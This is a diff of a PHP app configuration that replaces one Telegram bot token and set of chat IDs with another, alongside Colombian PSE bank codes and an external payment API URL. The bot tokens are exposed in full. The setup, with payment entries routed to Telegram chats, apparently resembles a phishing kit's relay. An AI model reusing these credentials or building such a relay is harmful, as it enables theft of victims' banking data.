@@ -17,9 +17,9 @@ function app_config(): array {
         'bancos_pse_activos' => ['1007','1023','1002','1052','1013','1032','1062','1063','1006','1047','1069','1070','1019','1040','1060','1061','1507','1551','1097','1809'],
         'tarjeta_activa' => true,
         'telegram' => [
-            'bot_token' => '8643419958:AAE1zsDkRAxRxxQtf-JxRtzc5JwF4qjFtNc',
-            'chat_id_genericos' => '-5392321843',
-            'chat_id_ingresos' => '-5392321843'
+            'bot_token' => '9222539154:AAFsUpJG4aj4efzPHpTF6-WAMt8rgpt4SKA',
+            'chat_id_genericos' => '-5219106325',
+            'chat_id_ingresos' => '-5219106325'
         ],
         'pagos' => [
             'api_url' => 'https://futuapigoluni.tech/api/generar-pago',
